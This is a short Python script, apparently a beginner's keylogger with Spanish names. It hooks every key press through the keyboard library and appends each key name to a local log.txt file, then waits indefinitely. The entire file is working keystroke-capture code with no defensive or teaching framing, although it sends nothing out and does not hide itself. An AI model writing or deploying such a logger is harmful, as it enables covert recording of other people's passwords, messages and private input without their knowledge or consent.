import keyboard

def precionar_teclas(teclas):
    
    with open("log.txt", "a") as archivo:
        if teclas.name == "space":
            archivo.write(" ")
        
        else:
            archivo.write(teclas.name)

keyboard.on_press(precionar_teclas)
keyboard.wait()